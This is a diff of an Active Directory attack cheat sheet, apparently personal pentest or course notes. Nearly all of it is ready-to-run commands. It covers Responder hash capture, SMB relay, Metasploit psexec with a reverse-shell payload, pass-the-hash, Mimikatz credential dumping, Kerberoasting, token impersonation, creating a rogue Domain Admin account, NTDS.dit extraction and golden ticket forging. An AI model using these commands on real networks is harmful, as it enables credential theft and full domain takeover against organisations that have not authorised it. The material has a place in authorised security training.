@@ -1,15 +1,31 @@
+# 1-SCANNING
+
 ip a
 sudo netdiscover -r <subnet>/24
-sudo nmap -sV -oA initial_scan_quick <ip-range>
+sudo nmap -sV -oA initial_scan_quick <subnet>/<ip-range>
+
+# 2-CAPTURING HASHES
+
 sudo nano /etc/responder/Responder.conf
 sudo responder -I eth0 -dvPv
 Hashes saved: `/usr/share/responder/logs/`
+Save hash in to hashes.txt
 
-Option1:
+# 3-CRACkING HASHES / SMB Relay
+
+## CRACkING HASHES:
+
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 
-Option2:
+## SMB Relay:
+
+### Identily hosts without smb signing 
+
+nmap --script=smb2-security-mode.nse -p445 <subnet>/24 -Pn
+
 sudo nano /etc/responder/Responder.conf
+
+save tasgets into targets.txt
 
 ```bash
 # Terminal 1 - Capture
@@ -17,12 +33,16 @@ $ sudo responder -I eth0 -dvPv
 
 # Terminal 2 - Relay
 $ impacket-ntlmrelayx -tf targets.txt -smb2support -i
+$ impacket-ntlmrelayx -tf targets.txt -smb2support 
 
 # Terminal 3 - Connect
 $ nc 127.0.0.1 11000
 ```
+shares
+use C$
 
-### Setup
+# 4-GAINING SHELL ACCESS
+
 ```bash
 $ msfconsole
 > search psexec
@@ -32,7 +52,7 @@ $ msfconsole
 > set LPORT <port>
 ```
 
-### Password Attack
+## Password Attack
 ```bash
 > set SMBDOMAIN <domain>
 > set SMBUSER <user>
@@ -41,7 +61,7 @@ $ msfconsole
 > exploit
 ```
 
-### Hash Attack (Pass-the-Hash)
+## Hash Attack (Pass-the-Hash)
 ```bash
 > set SMBUSER administrator
 > unset SMBDOMAIN
@@ -50,7 +70,7 @@ $ msfconsole
 > exploit
 ```
 
-## Manual PSExec (Python)
+### Manual PSExec (Python)
 
 ```bash
 # With password
@@ -64,23 +84,60 @@ net user /domain
 
 exit shell
 
+# 5-DOMAIN ENUMERATION
+
 bloodhound-python -u <user> -p <password> -d <domain> -ns <dc-ip> -c all
 
-impacket-secretsdump <domain>/<user>:<password>@<target-ip>
+# 6-PASS ATTACKS
 
+## pass the pass 
+
+crackmapexec smb <subnet>/24 -u <user> -d <domain> -p <password>
 crackmapexec smb <subnet>/24 -u <user> -d <domain> -p <password> --sam
+crackmapexec smb <subnet>/24 -u <user> -d <domain> -p <password> --shares
+
+## pass the hash
+
+crackmapexec smb <subnet>/24 -u administrator -H <hash> --local-auth
+crackmapexec smb <subnet>/24 -u administrator -H <hash> --local-auth --sam
+
+### get the database data
+
 cmedb
 hosts
 creds
 
+# DUMPING & CRACKING HASHES
+
+impacket-secretsdump <domain>/<user>:<password>@<target-ip>
+
 ```bash
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+# MIMKATZ
 
-Hashcat modes:
-- `m 1000` - NTLM (Windows)
-- `m 5500` - NetNTLMv1  
-- `m 5600` - NetNTLMv2
+```bash
+$ msfconsole
+> search psexec
+> use exploit/windows/smb/psexec
+> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+> set LHOST <your-ip>
+> set LPORT <port>
+> set SMBDOMAIN <domain>
+> set SMBUSER <user>
+> set SMBPASS <password>
+> set RHOSTS <target-ip>
+> exploit
+```
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Windows\\Temp\\mimikatz.exe
+shell
+cd C:\Windows\Temp
+mimikatz.exe
+
+privilege::debug
+sekurlsa::logonpasswords
+
+# KERBEROASTING
 
 echo "<dc-ip> <dc-hostname>.<domain> <domain>" | sudo tee -a /etc/hosts
 
@@ -88,9 +145,70 @@ impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request -outputf
 
 hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
 
-## NTDS.dit Dump (DCSync) - braucht Domain Admin
+# TOKEN IMPERSONATION
 
-impacket-secretsdump <domain>/<da-user>:<password>@<dc-ip> -just-dc-ntlm
+```bash
+$ msfconsole
+> search psexec
+> use exploit/windows/smb/psexec
+> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+> set LHOST <your-ip>
+> set LPORT <port>
+> set SMBDOMAIN <domain>
+> set SMBUSER <user>
+> set SMBPASS <password>
+> set RHOSTS <target-ip>
+> exploit
+```
 
-# falls Passwort expired -> Hash statt Passwort nutzen:
-impacket-secretsdump -hashes :<NT-HASH> <domain>/<da-user>@<dc-ip> -just-dc-ntlm
+load incognito
+list_tokens -u
+
+impersonate_token <domain>\\<user>
+shell
+whoami
+rev2self
+
+## ADD USER
+
+net user /add hacker Password /domain
+net goup "Domain Admins" hacker /ADD /DOMAIN
+
+### Prove it
+
+impacket-secretsdump <domain>/hacker:'Password'@<dc-ip>
+
+# DUMPING NTDS.dit
+
+impacket-secretsdump <domain>/hacker:Password@<dc-ip> -just-dc-ntlm
+save hasehs in to ntds.txt
+hashcat -m"1000" ntds.txt /usr/share/wordlists/rockyou.txt
+
+# GOLDEN TICKET
+
+```bash
+$ msfconsole
+> search psexec
+> use exploit/windows/smb/psexec
+> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+> set LHOST <your-ip>
+> set LPORT <port>
+> set SMBDOMAIN <domain>
+> set SMBUSER <loacal-admin>
+> set SMBPASS <password>
+> set RHOSTS <target-ip>
+> exploit
+```
+
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Windows\\Temp\\mimikatz.exe
+shell
+cd C:\Windows\Temp
+mimikatz.exe
+
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+COPY DOMAIN SID
+COPY NTLM HASH
+
+kerberos::golden /User:FakeUser /domain:MARVEL.local /sid:<SID> /krbtgt:<HASH> /id:500 /ptt
+misc::cmd
